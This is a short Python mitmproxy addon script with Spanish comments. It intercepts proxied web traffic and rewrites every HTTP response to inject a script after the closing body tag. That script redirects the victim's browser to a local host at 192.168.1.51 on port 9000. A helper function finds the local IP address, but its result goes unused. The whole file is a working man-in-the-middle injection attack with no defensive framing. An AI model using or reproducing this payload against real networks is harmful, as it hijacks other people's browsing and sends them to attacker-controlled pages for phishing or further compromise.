import mitmproxy
import socket

def get_local_ipv4():
    try:
        #Se conecta a un servidor externo para determinar la interfaz en uso
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))  #8.8.8.8 es el servir DNS de google
            local_ip = s.getsockname()[0]
        return local_ip
    except Exception as e:
        print(f"Error: {e}")
        return None

def response(flow):
    local_ipv4 = get_local_ipv4()
    flow.response.content  = flow.response.content.replace(b"</body>", b"</body><script>location = 'http://192.168.1.51:9000'</script>")
